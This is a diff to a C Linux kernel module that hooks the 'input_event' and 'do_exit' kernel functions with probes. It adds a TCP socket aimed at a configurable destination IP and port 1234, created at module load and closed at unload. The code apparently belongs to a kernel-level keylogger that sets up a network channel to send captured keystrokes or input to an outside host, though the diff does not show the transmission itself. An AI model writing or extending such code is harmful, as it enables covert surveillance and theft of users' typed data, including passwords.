@@ -9,6 +9,10 @@
 
 #include "headers.h"
 #include "protocol.h"
+#include "tcp_socket.h"
+
+#define DEST_IP ""
+#define DEST_PORT 1234
 
 #define HOOK_INPUT_EVENT "input_event"
 #define HOOK_PROCESS_EXIT "do_exit"
@@ -144,7 +148,14 @@ static void unregister_probes(int max_probes)
 static int __init hook_init(void)
 {
 	int ret;	
+	
+	/* Initialize module basic objects */
 	sock = tcp_sock_create();
+	if (IS_ERR(sock))
+	{
+		ret = -ENOMEM; // Socket probably has not enough memory
+		goto end;
+	}
 
 	ret = register_probes();
 	if (ret < 0)
@@ -155,7 +166,10 @@ end:
 
 static void __exit hook_exit(void)
 {
+	/* Close safely all module basic objects */
+	tcp_sock_close(sock);
 	unregister_probes(PROBES_SIZE);
+
 	printk(KERN_INFO "Unregisterd kernel probes");
 }
 
